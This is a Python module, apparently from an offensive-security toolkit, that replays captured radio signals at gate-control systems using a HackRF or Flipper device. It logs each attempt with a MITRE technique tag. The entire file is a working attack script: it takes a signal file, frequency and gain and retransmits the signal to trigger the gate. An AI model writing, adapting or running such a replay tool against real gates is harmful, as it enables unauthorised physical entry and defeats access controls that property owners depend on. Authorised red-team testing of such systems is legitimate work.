# modules/exploits/gate_rf_replay.py

import argparse
import subprocess
import os
import json
from datetime import datetime

LOG_FILE = "results/exploit_logs.json"
MITRE_TTP = "T0882"  # RF Command Injection (ICS)

def log_replay(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def replay_rf(signal_file, sdr_tool, frequency, gain):
    print(f"[+] Replaying RF from {signal_file} at {frequency} MHz using {sdr_tool}...")

    success = False
    try:
        if sdr_tool == "hackrf":
            cmd = [
                "hackrf_transfer", "-t", signal_file,
                "-f", str(int(float(frequency) * 1e6)),
                "-x", str(gain)
            ]
        elif sdr_tool == "flipper":
            cmd = ["flipper-cli", "send", signal_file]
        else:
            print("[!] Unsupported SDR tool")
            return

        subprocess.run(cmd, check=True)
        success = True
        print("[âœ“] RF signal replayed.")
    except Exception as e:
        print(f"[!] Error: {e}")

    log_replay({
        "timestamp": datetime.utcnow().isoformat(),
        "tool": sdr_tool,
        "signal_file": signal_file,
        "frequency": frequency,
        "gain": gain,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RF Replay Attack on Gate Control")
    parser.add_argument("--signal", required=True, help="Path to .sub or RF binary signal")
    parser.add_argument("--tool", required=True, choices=["hackrf", "flipper"], help="SDR tool to use")
    parser.add_argument("--freq", required=True, help="Frequency in MHz (e.g., 433.92)")
    parser.add_argument("--gain", type=int, default=20, help="TX gain (if applicable)")
    args = parser.parse_args()

    replay_rf(args.signal, args.tool, args.freq, args.gain)
